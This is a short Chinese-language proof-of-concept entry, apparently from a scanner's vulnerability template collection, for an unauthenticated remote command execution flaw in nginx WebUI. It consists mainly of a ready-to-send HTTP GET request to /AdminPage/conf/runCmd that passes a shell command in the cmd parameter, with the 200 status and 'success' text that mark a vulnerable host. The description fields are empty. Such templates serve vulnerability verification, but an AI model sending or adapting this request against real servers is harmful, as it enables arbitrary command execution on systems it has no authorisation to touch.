﻿# nginx WebUI 前台远程命令执行漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：success

> 上传文件定位：

> 验证文件来源：nginx WebUI 前台远程命令执行漏洞.poc
